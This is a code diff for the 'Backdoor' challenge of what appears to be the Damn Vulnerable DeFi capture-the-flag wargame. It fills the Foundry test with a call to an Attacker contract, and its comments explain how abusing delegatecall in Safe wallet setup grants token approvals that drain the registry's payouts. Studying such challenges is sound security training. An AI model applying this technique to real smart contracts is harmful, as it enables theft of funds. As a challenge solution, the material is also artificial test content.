@@ -7,6 +7,8 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {Attacker} from "../../src/backdoor/Attacker.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +72,15 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(walletFactory, walletRegistry, token, recovery);
+
+        // what attack does [for each user]:
+        // - calls SafeProxyFactory::createProxyWithCallback to create Safe, using walletRegistry as the callback and user as the owner:
+        //    - SafeProxy::setup() is called by factory
+        //    - vulnerability: setup() allows to execute a delegateCall -> we use the delegate call to make the Safe approve us some tokens
+        //    - callback is executed and tokens are transfered to the Safe
+        // - After tokens approved, call transferFrom to recovery address
+        attacker.attack(singletonCopy, users, AMOUNT_TOKENS_DISTRIBUTED / users.length);
     }
 
     /**
